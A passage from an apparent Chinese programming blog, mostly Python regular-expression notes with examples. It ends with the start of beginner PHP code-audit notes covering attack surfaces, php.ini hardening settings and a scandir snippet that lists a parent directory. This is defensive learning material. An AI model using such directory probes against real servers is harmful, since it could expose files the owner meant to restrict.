class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">[<span class="string">'a4a4a你'</span>, <span class="string">'好dg4g654'</span>]</span><br></pre></td></tr></table></figure>

<h4 id="r原生字符"><a href="#r原生字符" class="headerlink" title="r原生字符"></a>r原生字符</h4><p>将在python里有特殊意义的字符如\b，转换成原生字符（就是去除它在python的特殊意义），不然会给正则表达式有冲突，为了避免这种冲突可以在规则前加原始字符r</p>
<p>(这里还有点问题，结果不太懂，为啥第一个不输出 [a\b] )</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = re.findall(<span class="string">r"a\b"</span>,<span class="string">"welcoma\b"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">[<span class="string">'a'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = re.findall(<span class="string">"a\b"</span>,<span class="string">"welcoma\b"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">[<span class="string">'a\x08'</span>]</span><br></pre></td></tr></table></figure>

<h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><p>result = re.method(“rule”,string)</p>
<h4 id="1-match-方法-从字符串头部开始匹配"><a href="#1-match-方法-从字符串头部开始匹配" class="headerlink" title="1. match()方法, 从字符串头部开始匹配"></a>1. match()方法, 从字符串头部开始匹配</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'The 123456 is my one phone number.'</span></span><br><span class="line">print(len(content)) <span class="comment">#字符串长度</span></span><br><span class="line">result = re.match(<span class="string">r'^The\s\d+\s\w*'</span>, content) <span class="comment">#使用match匹配, 第一个参数为正则表达式, 第二个为要匹配的字符串</span></span><br><span class="line">print(result)</span><br><span class="line">print(result.group()) <span class="comment">#输出匹配内容</span></span><br><span class="line">print(result.span()) <span class="comment">#输出匹配内容的位置索引</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">34</span></span><br><span class="line">&lt;_sre.SRE_Match object; span=(<span class="number">0</span>, <span class="number">13</span>), match='The <span class="number">123456</span> is'&gt;</span><br><span class="line">The <span class="number">123456</span> is</span><br><span class="line">(<span class="number">0</span>, <span class="number">13</span>)</span><br></pre></td></tr></table></figure>

<h4 id="2-匹配目标"><a href="#2-匹配目标" class="headerlink" title="2. 匹配目标"></a>2. 匹配目标</h4><p>在正则表达式中用()括起来可以使用group()输出, 若有n个(), 那么可以表示为group(n), 输出第n个括号匹配的内容.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'The 123456 is my one phone number.'</span></span><br><span class="line">print(len(content)) <span class="comment">#字符串长度</span></span><br><span class="line">result = re.match(<span class="string">r'^The\s(\d+)\sis'</span>, content) <span class="comment">#使用match匹配, 第一个参数为正则表达式, 第二个为要匹配的字符串</span></span><br><span class="line">print(result)</span><br><span class="line">print(result.group()) <span class="comment">#输出匹配内容</span></span><br><span class="line">print(result.group(<span class="number">1</span>)) <span class="comment">#输出第一个被()包裹的内容</span></span><br><span class="line">print(result.span()) <span class="comment">#输出匹配内容的位置索引</span></span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">34</span></span><br><span class="line">&lt;_sre.SRE_Match object; span=(<span class="number">0</span>, <span class="number">13</span>), match='The <span class="number">123456</span> is'&gt;</span><br><span class="line">The <span class="number">123456</span> is</span><br><span class="line"><span class="number">123456</span></span><br><span class="line">(<span class="number">0</span>, <span class="number">13</span>)</span><br></pre></td></tr></table></figure>

<h4 id="3-通用匹配"><a href="#3-通用匹配" class="headerlink" title="3.通用匹配"></a>3.通用匹配</h4><p>. 表示匹配任意字符, *表示匹配前面字符无限次.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'The 123456 is my one phone number.'</span></span><br><span class="line">result = re.match(<span class="string">r'^The.*number.$'</span>, content) <span class="comment">#使用match匹配, 第一个参数为正则表达式, 第二个为要匹配的字符串</span></span><br><span class="line">print(result)</span><br><span class="line">print(result.group()) <span class="comment">#输出匹配内容</span></span><br><span class="line">print(result.span()) <span class="comment">#输出匹配内容的位置索引</span></span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;_sre.SRE_Match object; span=(<span class="number">0</span>, <span class="number">34</span>), match='The <span class="number">123456</span> <span class="keyword">is</span> <span class="keyword">my</span> one phone <span class="built_in">number</span>.'&gt;</span><br><span class="line">The <span class="number">123456</span> <span class="keyword">is</span> <span class="keyword">my</span> one phone <span class="built_in">number</span>.</span><br><span class="line">(<span class="number">0</span>, <span class="number">34</span>)</span><br></pre></td></tr></table></figure>

<h4 id="4-贪婪与非贪婪"><a href="#4-贪婪与非贪婪" class="headerlink" title="4.贪婪与非贪婪"></a>4.贪婪与非贪婪</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'The 123456 is my one phone number.'</span></span><br><span class="line">print(<span class="string">'贪婪匹配:'</span>)</span><br><span class="line">result = re.match(<span class="string">r'^The.*(\d+).*'</span>, content) <span class="comment">#使用match匹配, 第一个参数为正则表达式, 第二个为要匹配的字符串</span></span><br><span class="line">print(result.group()) <span class="comment">#输出匹配内容</span></span><br><span class="line">print(<span class="string">'result = %s'</span>%result.group(<span class="number">1</span>)) <span class="comment">#输出第一个被()包裹的内容</span></span><br><span class="line">print(<span class="string">'-'</span>*<span class="number">20</span>)</span><br><span class="line">print(<span class="string">'非贪婪匹配:'</span>)</span><br><span class="line">result = re.match(<span class="string">r'^The.*?(\d+).*'</span>, content) </span><br><span class="line">print(result.group())</span><br><span class="line">print(<span class="string">'result = %s'</span>%result.group(<span class="number">1</span>))</span><br><span class="line">print(<span class="string">'-'</span>*<span class="number">20</span>)</span><br><span class="line">result = re.match(<span class="string">r'^The.*?(\d+).*?'</span>, content)</span><br><span class="line">print(result.group())</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">贪婪匹配:</span><br><span class="line">The 123456 is my one phone number.</span><br><span class="line">result = 6</span><br><span class="line">--------------------</span><br><span class="line">非贪婪匹配:</span><br><span class="line">The 123456 is my one phone number.</span><br><span class="line">result = 123456</span><br><span class="line">--------------------</span><br><span class="line">The 123456</span><br></pre></td></tr></table></figure>

<h4 id="5-修饰符-re-S"><a href="#5-修饰符-re-S" class="headerlink" title="5.修饰符 re.S"></a>5.修饰符 re.S</h4><p>由于加上re.S参数后, 通配符 . 将可以匹配换行符, 所以result不为空, result2为空。除了re.S, 还有许多修饰符如, </p>
<p>re.I: 使用匹配时忽略大小写。（大写的i）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'''The 123456 is</span></span><br><span class="line"><span class="string">one of my phone.</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">result = re.match(<span class="string">'^The.*?(\d+).*?phone.'</span>, content, re.S)</span><br><span class="line"><span class="keyword">if</span> result:</span><br><span class="line">    print(result.group(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'result = None'</span>)</span><br><span class="line">result2 = re.match(<span class="string">'^The.*?(\d+).*?phone.'</span>, content)</span><br><span class="line"><span class="keyword">if</span> result2:</span><br><span class="line">    print(result2.group(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'result2 = None'</span>)</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">123456</span><br><span class="line">result2 = None</span><br></pre></td></tr></table></figure>

<h4 id="6-转义匹配"><a href="#6-转义匹配" class="headerlink" title="6.转义匹配"></a>6.转义匹配</h4><p>由于()属于正则表达式的特殊字符, 因此在需要匹配()时, 需要加上转义字符’’.</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'(百度)www.baidu.com'</span></span><br><span class="line">result = re.<span class="keyword">match</span>(<span class="string">'(百度)www.baidu.com'</span>, content)</span><br><span class="line">result2 = re.<span class="keyword">match</span>(<span class="string">'\(百度\)www\.baidu\.com'</span>, content)</span><br><span class="line"><span class="keyword">if</span> result:</span><br><span class="line">    <span class="keyword">print</span>(result.<span class="keyword">group</span>())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">'result = None'</span>)</span><br><span class="line"><span class="keyword">if</span> result2:</span><br><span class="line">    <span class="keyword">print</span>(result2.<span class="keyword">group</span>())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">'result2 = None'</span>)</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = None</span><br><span class="line">(百度)www<span class="selector-class">.baidu</span><span class="selector-class">.com</span></span><br></pre></td></tr></table></figure>

<h4 id="7-search-方法-与match-方法不同-不需要从头部开始匹配"><a href="#7-search-方法-与match-方法不同-不需要从头部开始匹配" class="headerlink" title="7.search()方法, 与match()方法不同, 不需要从头部开始匹配"></a>7.search()方法, 与match()方法不同, 不需要从头部开始匹配</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line"><span class="attribute">content</span> = <span class="string">'Other The 123456 is my one phone number.'</span></span><br><span class="line">result = re.search(<span class="string">'The.*?(\d+).*?number.'</span>, <span class="attribute">content</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(result.group()</span></span>)</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The <span class="number">123456</span> <span class="keyword">is</span> <span class="keyword">my</span> one phone <span class="built_in">number</span>.</span><br></pre></td></tr></table></figure>

<h4 id="8-findall-方法"><a href="#8-findall-方法" class="headerlink" title="8.findall()方法"></a>8.findall()方法</h4><p>match()和search()都是返回匹配到的第一个内容就结束匹配, findall()是返回所有符合匹配规则的内容</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">html = '''</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"songs-list"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">"title"</span>&gt;</span>歌单<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"introduction"</span>&gt;</span>歌单列表<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"list"</span> <span class="attr">class</span>=<span class="string">"list-group"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"2"</span>&gt;</span>一路上有你<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"7"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/2.mp3"</span> <span class="attr">singer</span>=<span class="string">"任贤齐"</span>&gt;</span>沧海一声笑<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"4"</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/3.mp3"</span> <span class="attr">singer</span>=<span class="string">"齐秦"</span>&gt;</span>往事随风<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"6"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/4.mp3"</span> <span class="attr">singer</span>=<span class="string">"beyond"</span>&gt;</span>光辉岁月<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"5"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/5.mp3"</span> <span class="attr">singer</span>=<span class="string">"程慧玲"</span>&gt;</span>记事本<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-veiw</span>=<span class="string">"5"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/6.mp3"</span> <span class="attr">singer</span>=<span class="string">"邓丽君"</span>&gt;</span>但愿人长久<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">'''</span><br><span class="line"></span><br><span class="line">result = re.findall('<span class="tag">&lt;<span class="name">li.*?href="(.*?)".*?singer="(.*?)"</span>&gt;</span>(.*?)<span class="tag">&lt;/<span class="name">a</span>&gt;</span>', html, re.S)</span><br><span class="line">if result:</span><br><span class="line">    print(result)</span><br><span class="line">    for res in result:</span><br><span class="line">        print(res[0], res[1], res[2])</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[(<span class="string">'/2.mp3'</span>, <span class="string">'任贤齐'</span>, <span class="string">'沧海一声笑'</span>), (<span class="string">'/3.mp3'</span>, <span class="string">'齐秦'</span>, <span class="string">'往事随风'</span>), (<span class="string">'/4.mp3'</span>, <span class="string">'beyond'</span>, <span class="string">'光辉岁月'</span>), (<span class="string">'/5.mp3'</span>, <span class="string">'程慧玲'</span>, <span class="string">'记事本'</span>), (<span class="string">'/6.mp3'</span>, <span class="string">'邓丽君'</span>, <span class="string">'但愿人长久'</span>)]</span><br><span class="line">/<span class="number">2</span><span class="selector-class">.mp3</span> 任贤齐 沧海一声笑</span><br><span class="line">/<span class="number">3</span><span class="selector-class">.mp3</span> 齐秦 往事随风</span><br><span class="line">/<span class="number">4</span><span class="selector-class">.mp3</span> beyond 光辉岁月</span><br><span class="line">/<span class="number">5</span><span class="selector-class">.mp3</span> 程慧玲 记事本</span><br><span class="line">/<span class="number">6</span><span class="selector-class">.mp3</span> 邓丽君 但愿人长久</span><br></pre></td></tr></table></figure>

<h4 id="9-sub-方法-去除匹配的字符"><a href="#9-sub-方法-去除匹配的字符" class="headerlink" title="9.sub()方法, 去除匹配的字符"></a>9.sub()方法, 去除匹配的字符</h4><p>第二个参数是两个’，表示吧’\d+‘ 匹配的内容替换成空，如果写sub(’\d+’, ‘?’), 则把匹配的内容替换成 ?。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line"><span class="attribute">content</span> = <span class="string">'54abc59de335f7778888g'</span></span><br><span class="line">result = re.sub(<span class="string">'\d+'</span>, <span class="string">''</span>, <span class="attribute">content</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(result)</span></span></span><br><span class="line">result = re.sub(<span class="string">'\d'</span>, <span class="string">'?'</span>, <span class="attribute">content</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(result)</span></span></span><br><span class="line">result = re.sub(<span class="string">'\d+'</span>, <span class="string">'?'</span>, <span class="attribute">content</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(result)</span></span></span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abcdefg</span><br><span class="line">??abc??<span class="keyword">de</span>???f???????<span class="keyword">g</span></span><br><span class="line">?abc?<span class="keyword">de</span>?f?<span class="keyword">g</span></span><br></pre></td></tr></table></figure>

<p>有点像replace，但是多一个正则关系匹配</p>
<h4 id="10-compile"><a href="#10-compile" class="headerlink" title="10.compile()"></a>10.compile()</h4><p>在需要匹配相同正则表达式情况下, 事先定义一个compile可以简化代码量, 同时compile中也可以使用修饰符re.S等.</p>
<p>( 其实也可以直接a=rule，然后 result = re.findall(a,string) ,但是这样子就不能用修饰符re.S了)</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">content1 = '2016-1-1 12:01'</span><br><span class="line">content2 = '2017-1-1 12:02'</span><br><span class="line">content3 = '2018-1-1 12:03'</span><br><span class="line"></span><br><span class="line">pattern = re.compile('\d&#123;2&#125;:\d&#123;2&#125;')</span><br><span class="line">result1 = re.sub(pattern, '', content1)</span><br><span class="line">result2 = re.sub(pattern, '', content2)</span><br><span class="line">result3 = re.sub(pattern, '', content3)</span><br><span class="line">print(result1, result2, result3)</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2016</span><span class="number">-1</span><span class="number">-1</span>  <span class="number">2017</span><span class="number">-1</span><span class="number">-1</span>  <span class="number">2018</span><span class="number">-1</span><span class="number">-1</span></span><br></pre></td></tr></table></figure>

<p>附一手去除列表空元素的方法：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mytest = [<span class="selector-tag">i</span> <span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> test <span class="keyword">if</span> <span class="selector-tag">i</span> != <span class="string">''</span>]</span><br></pre></td></tr></table></figure>

<h3 id="番外"><a href="#番外" class="headerlink" title="番外"></a>番外</h3><p>这里记一下从从Li4n0学长脚本中发现的字符表替换函数：<strong>maketrans()</strong></p>
<p>语法：str.maketrans(intab, outtab)</p>
<p>参数：</p>
<p>intab – 字符串中要替代的字符组成的字符串</p>
<p>outtab – 相应的映射字符的字符串。</p>
<p>配合str.translate使用</p>
<p>实例</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">intab = <span class="string">"aeiou"</span></span><br><span class="line">outtab = <span class="string">"4310U"</span></span><br><span class="line">transtab = str.maketrans(intab, outtab)</span><br><span class="line"></span><br><span class="line">content = <span class="string">"this is string example....wow!!!"</span></span><br><span class="line">print (content.translate(transtab))</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">th1s <span class="number">1</span>s str1ng <span class="number">3</span>x4mpl3....w0w!!!</span><br></pre></td></tr></table></figure>

<hr>
<p>参考资料：</p>
<p><a href="https://blog.csdn.net/qq_38038143/article/details/80671420" target="_blank" rel="noopener">https://blog.csdn.net/qq_38038143/article/details/80671420</a></p>
<p><a href="https://www.cnblogs.com/zjltt/p/6955965.html" target="_blank" rel="noopener">https://www.cnblogs.com/zjltt/p/6955965.html</a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2019/07/18/代码审计基础入门笔记/">
                代码审计基入门笔记
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2019-07-18</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="代码审计基础入门笔记"><a href="#代码审计基础入门笔记" class="headerlink" title="代码审计基础入门笔记"></a>代码审计基础入门笔记</h1><h3 id="审计大致方向、思路"><a href="#审计大致方向、思路" class="headerlink" title="审计大致方向、思路"></a>审计大致方向、思路</h3><p>注入</p>
<p>文件上传</p>
<p>跨站</p>
<p>程序异常处理</p>
<p>MVC架构：</p>
<p>Model：数据逻辑部分</p>
<p>View：处理数据显示的部分，显示数据</p>
<p>Controller：应用程序中处理用户交互的部分</p>
<p>常见php框架</p>
<p>先看手册、架构，安全过滤机制，</p>
<p>ThinkPHP</p>
<p>Yaf</p>
<p>Laravel</p>
<p>Kohana</p>
<p>Codelgniter</p>
<p>Yii</p>
<p>Smyfony</p>
<p>doitphp</p>
<p>处理流程</p>
<p>获取请求、<strong>全局过滤</strong>、模块文件、C函数内容、M函数内容、V显示</p>
<p>网站目录结构</p>
<p>主目录</p>
<p>模块目录</p>
<p>插件目录</p>
<p>上传目录</p>
<p>模块目录</p>
<p>数据目录</p>
<p>配置目录</p>
<p>配置文件</p>
<p>公共函数文件</p>
<p>安全过滤文件</p>
<p>数据库结构</p>
<p>入口文件</p>
<p>通读原文：函数集文件、配置文件（config.php）、安全过滤文件（lib.php）、index文件</p>
<p>敏感关键字回溯参数？</p>
<p>查找可控变量（高明的黑客）</p>
<p>功能点定向审计</p>
<p>程序安装、文件上传、文件管理、登录验证、备份恢复、找回密码</p>
<p>一切输入都是有害的</p>
<p>一切进入函数的变量都是有害的（危险函数）</p>
<h3 id="php-ini"><a href="#php-ini" class="headerlink" title="php.ini"></a>php.ini</h3><p>安全模式，safe_mode = off 【5.4.0后被移除】</p>
<p>禁用函数，disable_function = system</p>
<p>com组件,com.allow_dcom = false</p>
<p>全局变量注册开关 register_globals = Off    (使用$_GET[‘name’]来获取数据)</p>
<p>【为On时，POST或GET，都将自动使用全局变量的值来接受值】</p>
<p>魔术引号自动过滤： magic_quotes_gpc = on 开启时把单引号、双引号、反斜杠、和NULL加上反斜杠“\”进行转义，影响GET、POST、Cookies。开启以提高安全性，【5.4.0后被移除】</p>
<p>是否允许包含远程文件 allow_url_inlude = off</p>
<p>是否允许打开远程文件 allow_url_open = on</p>
<p>目录权限</p>
<p>HTTP头部版本信息泄露PHP版  expose_php = off</p>
<p>文件上传临时目录  upload_tmp_dir = （不设定则采用系统的临时目录）</p>
<p>用户可访问目录  open_basedir = E:\Local Test\WWW  (限制脚本的活动区域)</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="name">scandir</span>(<span class="name">dirname</span>(<span class="name">path</span>: __FILE__.<span class="string">"./../"</span>)))(上层目录)</span><br></pre></td></tr></table></figure>

<p>内部错误选项   display_errors = on (调试时开启，发布后关闭，避免爆出物理地址)</p>
<p>错误报告级别  error_reporting = E_ALL &amp; ~E_NOTICE    (最高级别)</p>
<h3 id="代码调试小技巧"><a href="#代码调试小技巧" class="headerlink" title="代码调试小技巧"></a>代码调试小技巧</h3><p>print_r($var)</p>
<p>var_dump($var)    详细、数据类型、长度</p>
<p>debug_zval_dump  比print_r多一个调用次数</p>
<p>debug_print_backtrace();显示函数调用栈的信息</p>
<p>exit();当断点用好了</p>
<p>Xdebug，调试php代码的工具</p>
<p>配置</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563197438631.png" alt="1563197438631"></p>
<h3 id="全局变量和超全局变量"><a href="#全局变量和超全局变量" class="headerlink" title="全局变量和超全局变量"></a>全局变量和超全局变量</h3><p>全局变量：全局变量在函数外定义，作用于不到函数内，函数内一用，global $a;</p>
<p>超全局变量：所有脚本有效，$_GET,$_POST,$_SERVER,$_COOKIE,其他的存在$GLOBALS数组中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_REQUEST	$_ENV	$_SESSION	$_FILES</span><br></pre></td></tr></table></figure>

<p>globals $name;    参数传递的作用</p>
<p>$GLOBALS[‘name’] =  123    变量的作用域设置的全局</p>
<p>$_REQUEST = POST or GET</p>
<p>$_SERVER     保存关于报头、路径和脚本位置的信息。</p>
